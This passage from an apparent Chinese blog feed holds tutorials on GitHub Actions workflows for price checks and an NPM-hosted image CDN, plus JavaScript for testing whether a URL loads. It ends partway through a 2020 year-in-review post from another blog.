content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 4分8秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量...</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 